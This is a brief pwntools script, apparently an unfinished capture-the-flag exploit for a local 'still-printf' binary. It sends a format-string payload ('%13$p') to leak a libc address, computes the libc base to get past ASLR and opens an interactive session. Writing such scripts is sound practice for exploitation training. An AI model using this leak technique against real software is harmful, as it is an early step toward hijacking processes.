from pwn import *

p=process("./still-printf")
#libc=ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
libc=ELF("./libc-2.28.so")

gdb.attach(p)

payload = "%13$p"

p.sendline(payload)

libc_leak = int(p.recvuntil('\n'),16)
log.info("libc_leak : "+hex(libc_leak)) #__libc_start_main+231

libc_base = libc_leak - libc.symbols['__libc_start_main'] - 0xe7
log.info("libc_base : "+hex(libc_base))

p.interactive()
